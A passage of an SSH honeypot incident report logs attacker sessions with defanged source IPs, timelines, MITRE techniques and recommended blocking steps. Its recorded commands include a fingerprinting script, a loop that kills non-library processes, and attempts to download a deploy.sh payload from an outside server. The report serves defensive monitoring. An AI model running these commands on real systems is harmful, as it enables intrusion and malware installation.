| `2026-07-28 14:42:01` | `cowrie.command.success` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.log.closed` |
| `2026-07-28 14:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49ace5628944

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:43 |
| **Last Seen** | 2026-07-28 14:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:43:13` | `cowrie.session.connect` |
| `2026-07-28 14:43:13` | `cowrie.client.version` |
| `2026-07-28 14:43:13` | `cowrie.client.kex` |
| `2026-07-28 14:43:14` | `cowrie.login.success` |
| `2026-07-28 14:43:15` | `cowrie.session.params` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.success` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:15` | `cowrie.command.input` |
| `2026-07-28 14:43:16` | `cowrie.log.closed` |
| `2026-07-28 14:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03aaf90fa49a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:44 |
| **Last Seen** | 2026-07-28 14:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:44:31` | `cowrie.session.connect` |
| `2026-07-28 14:44:31` | `cowrie.client.version` |
| `2026-07-28 14:44:31` | `cowrie.client.kex` |
| `2026-07-28 14:44:32` | `cowrie.login.success` |
| `2026-07-28 14:44:33` | `cowrie.session.params` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.success` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.command.input` |
| `2026-07-28 14:44:33` | `cowrie.log.closed` |
| `2026-07-28 14:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0869b959a53f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:45 |
| **Last Seen** | 2026-07-28 14:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:45:49` | `cowrie.session.connect` |
| `2026-07-28 14:45:49` | `cowrie.client.version` |
| `2026-07-28 14:45:49` | `cowrie.client.kex` |
| `2026-07-28 14:45:49` | `cowrie.login.success` |
| `2026-07-28 14:45:51` | `cowrie.session.params` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.success` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.command.input` |
| `2026-07-28 14:45:51` | `cowrie.log.closed` |
| `2026-07-28 14:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b1061bd3ae

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:47 |
| **Last Seen** | 2026-07-28 14:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:47:06` | `cowrie.session.connect` |
| `2026-07-28 14:47:06` | `cowrie.client.version` |
| `2026-07-28 14:47:06` | `cowrie.client.kex` |
| `2026-07-28 14:47:08` | `cowrie.login.success` |
| `2026-07-28 14:47:09` | `cowrie.session.params` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.success` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:09` | `cowrie.command.input` |
| `2026-07-28 14:47:10` | `cowrie.log.closed` |
| `2026-07-28 14:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1def334800c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:48 |
| **Last Seen** | 2026-07-28 14:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:48:27` | `cowrie.session.connect` |
| `2026-07-28 14:48:27` | `cowrie.client.version` |
| `2026-07-28 14:48:27` | `cowrie.client.kex` |
| `2026-07-28 14:48:28` | `cowrie.login.success` |
| `2026-07-28 14:48:29` | `cowrie.session.params` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.success` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.command.input` |
| `2026-07-28 14:48:29` | `cowrie.log.closed` |
| `2026-07-28 14:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60eea4aa69a2

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-07-28 14:49 |
| **Last Seen** | 2026-07-28 14:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:49:02` | `cowrie.session.connect` |
| `2026-07-28 14:49:02` | `cowrie.client.version` |
| `2026-07-28 14:49:02` | `cowrie.client.kex` |
| `2026-07-28 14:49:04` | `cowrie.login.success` |
| `2026-07-28 14:49:04` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac3bb5b2057e

| Field | Detail |
|---|---|
| **Source IP** | `220.179.87[.]204` |
| **First Seen** | 2026-07-28 14:49 |
| **Last Seen** | 2026-07-28 14:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:49:10` | `cowrie.session.connect` |
| `2026-07-28 14:49:12` | `cowrie.client.version` |
| `2026-07-28 14:49:12` | `cowrie.client.kex` |
| `2026-07-28 14:49:15` | `cowrie.login.success` |
| `2026-07-28 14:49:16` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.179.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `220.179.87[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2880fd939724

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:49 |
| **Last Seen** | 2026-07-28 14:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:49:51` | `cowrie.session.connect` |
| `2026-07-28 14:49:51` | `cowrie.client.version` |
| `2026-07-28 14:49:51` | `cowrie.client.kex` |
| `2026-07-28 14:49:53` | `cowrie.login.success` |
| `2026-07-28 14:49:54` | `cowrie.session.params` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.success` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.command.input` |
| `2026-07-28 14:49:54` | `cowrie.log.closed` |
| `2026-07-28 14:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9e5f48f020

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-28 14:50 |
| **Last Seen** | 2026-07-28 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_OK` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:50:51` | `cowrie.session.connect` |
| `2026-07-28 14:50:52` | `cowrie.login.success` |
| `2026-07-28 14:50:52` | `cowrie.session.params` |
| `2026-07-28 14:50:52` | `cowrie.command.input` |
| `2026-07-28 14:50:53` | `cowrie.log.closed` |
| `2026-07-28 14:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e69021af14

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-28 14:50 |
| **Last Seen** | 2026-07-28 14:51 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo WRITABLE >/tmp/.testfile 2>&1, ls -l /tmp/.testfile 2>&1, rm -f /tmp/.testfile, cd /tmp, for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num" 2>/dev/null; fi; fi; done;` |
| **Download Attempts** | hxxp://91.199.133[.]133:8080/deploy.sh, hxxp://91.199.133[.]133:8080/deploy.sh, b5147693ed4a8744cd3c32e2a2b8c6ec77acc6c8f0494b994398161a0ba009c5 |
| **Malware Analysis** | 0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7 (LOW) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1489 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:50:53` | `cowrie.session.connect` |
| `2026-07-28 14:50:55` | `cowrie.login.success` |
| `2026-07-28 14:50:55` | `cowrie.session.params` |
| `2026-07-28 14:50:56` | `cowrie.command.input` |
| `2026-07-28 14:50:57` | `cowrie.command.input` |
| `2026-07-28 14:50:57` | `cowrie.command.input` |
| `2026-07-28 14:50:58` | `cowrie.command.input` |
| `2026-07-28 14:50:58` | `cowrie.command.input` |
| `2026-07-28 14:50:58` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.failed` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.command.input` |
| `2026-07-28 14:50:59` | `cowrie.session.file_download` |
| `2026-07-28 14:50:59` | `cowrie.session.file_download.failed` |
| `2026-07-28 14:50:59` | `cowrie.session.file_download` |
| `2026-07-28 14:51:19` | `cowrie.command.input` |
| `2026-07-28 14:51:21` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.input` |
| `2026-07-28 14:51:22` | `cowrie.command.failed` |
| `2026-07-28 14:51:22` | `cowrie.command.failed` |
| `2026-07-28 14:51:22` | `cowrie.command.failed` |
| `2026-07-28 14:51:22` | `cowrie.command.failed` |
| `2026-07-28 14:51:47` | `cowrie.session.input` |
| `2026-07-28 14:51:49` | `cowrie.session.file_download` |
| `2026-07-28 14:51:49` | `cowrie.session.file_download` |
| `2026-07-28 14:51:49` | `cowrie.log.closed` |
| `2026-07-28 14:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51fe01c8e34b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:51 |
| **Last Seen** | 2026-07-28 14:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:51:13` | `cowrie.session.connect` |
| `2026-07-28 14:51:13` | `cowrie.client.version` |
| `2026-07-28 14:51:13` | `cowrie.client.kex` |
| `2026-07-28 14:51:13` | `cowrie.login.success` |
| `2026-07-28 14:51:15` | `cowrie.session.params` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.success` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.command.input` |
| `2026-07-28 14:51:15` | `cowrie.log.closed` |
| `2026-07-28 14:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-736656013c31

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:52 |
| **Last Seen** | 2026-07-28 14:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:52:28` | `cowrie.session.connect` |
| `2026-07-28 14:52:29` | `cowrie.client.version` |
| `2026-07-28 14:52:29` | `cowrie.client.kex` |
| `2026-07-28 14:52:30` | `cowrie.login.success` |
| `2026-07-28 14:52:31` | `cowrie.session.params` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.success` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.command.input` |
| `2026-07-28 14:52:31` | `cowrie.log.closed` |
| `2026-07-28 14:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d01fb694798

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:53 |
| **Last Seen** | 2026-07-28 14:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:53:43` | `cowrie.session.connect` |
| `2026-07-28 14:53:43` | `cowrie.client.version` |
| `2026-07-28 14:53:43` | `cowrie.client.kex` |
| `2026-07-28 14:53:44` | `cowrie.login.success` |
| `2026-07-28 14:53:45` | `cowrie.session.params` |
| `2026-07-28 14:53:45` | `cowrie.command.input` |
